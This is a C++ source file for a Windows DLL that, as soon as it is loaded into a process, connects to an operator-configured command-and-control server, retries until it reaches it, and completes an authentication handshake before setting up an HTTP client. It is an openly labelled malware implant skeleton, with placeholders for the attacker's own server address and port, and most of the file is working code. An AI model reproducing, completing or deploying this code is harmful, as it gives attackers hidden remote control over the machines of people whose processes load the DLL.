#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#include <iostream>
#include <Windows.h>
#include <WinSock2.h>
#include <WS2tcpip.h>
#include "HTTPClient.h"

void DebugMode();
void Main();

#define IP_ADDR "127.0.0.1" // Change this to your CnC IP address
#define PORT 5000 // Change this to your CnC Port

#define AUTH 0x01
#define SUCCESS 0x0F

BOOL WINAPI DllMain(HINSTANCE hInstance, DWORD dwReason, LPVOID lpvReserved) {
	switch (dwReason) {
	case DLL_PROCESS_ATTACH:
#ifndef NDEBUG
		DebugMode();
#endif
		Main();
		break;
	}
	return TRUE;
}

void Main() {
	WSADATA wsa;
	int nRes = WSAStartup(MAKEWORD(2, 2), &wsa);

	if (nRes != 0) {
		std::cout << "[ERROR] An error occurred during WSAStartup" << std::endl;
		throw std::exception();
		return;
	}

	SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (sock == INVALID_SOCKET) {
		std::cout << "[ERROR] Error initializing our socket" << std::endl;;
		throw std::exception();
		return;
	}

	SOCKADDR_IN saIn = { };
	saIn.sin_family = AF_INET;
	saIn.sin_port = htons(PORT);
	inet_pton(AF_INET, IP_ADDR, &saIn.sin_addr.s_addr);

	nRes = connect(sock, (SOCKADDR*)&saIn, sizeof(saIn));
	
	while(nRes == SOCKET_ERROR) {
		nRes = connect(sock, (SOCKADDR*)&saIn, sizeof(saIn));
		std::cout << "[ERROR] Error connecting to the CnC. Trying again in 5 seconds..." << std::endl;
		Sleep(5000);
	}

	std::cout << "[SUCCESS] Connected to the CnC. Authenticating..." << std::endl;

	/* AUTHENTICATION STAGE */
	char auth[] = { AUTH };
	send(sock, auth, sizeof(auth), 0);

	char authResp[1024];
	recv(sock, authResp, sizeof(authResp), 0);

	if (authResp[0] != AUTH) {
		std::cout << "[ERROR] Invalid response from the CnC" << std::endl;
		return;
	}
	
	std::string code;
	code.append(&authResp[1], 16);

	UINT nBuffSize = 0;
	char authBuff[1024];
	authBuff[nBuffSize] = AUTH;
	nBuffSize++;
	memcpy(&authBuff[nBuffSize], code.data(), code.size());
	nBuffSize += code.size();

	send(sock, authBuff, nBuffSize, 0);

	char status[1];
	recv(sock, status, sizeof(status), 0);
	if (status[0] != SUCCESS) {
		std::cout << "[ERROR] Error during authentication" << std::endl;
		return;
	}

	std::cout << "[SUCCESS] Authenticated with the CnC" << std::endl;

	HTTPClient http { };
}

void DebugMode() {
	FILE* f;
	AllocConsole();
	freopen_s(&f, "CONOUT$", "w", stdout);
	return;
}